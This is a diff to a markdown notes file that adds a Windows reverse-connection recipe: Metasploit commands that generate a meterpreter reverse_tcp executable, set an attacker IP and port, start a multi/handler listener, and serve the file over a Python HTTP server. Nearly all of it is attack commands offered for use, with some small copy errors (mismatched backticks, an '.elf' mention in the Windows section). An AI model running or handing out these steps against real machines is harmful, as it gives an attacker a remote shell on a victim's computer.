@@ -19,5 +19,29 @@ exploit
 
 ### Now go to that location where the .elf file is present and 
 
-python3 -m http.server --bind your_ip port_no
+``python3 -m http.server --bind your_ip port_no```
 
+
+## For windows reverse connection 
+
+```msfconsole```
+
+```use payload/windows/x64/meterpreter/reverse_tcp```
+## Set 
+```
+set LHOST Attackers_IP
+set LPORT any_port_no eg:- 6969
+
+generate -f exe -o /home/kali/msf/a.exe
+back
+use multi/handler
+
+set LHOST 192.168.74.129
+set LPORT 6969
+set payload windows/x64/meterpreter/reverse_tcp
+exploit
+```
+
+### Now go to that location where the .elf file is present and 
+
+``python3 -m http.server --bind your_ip port_no```
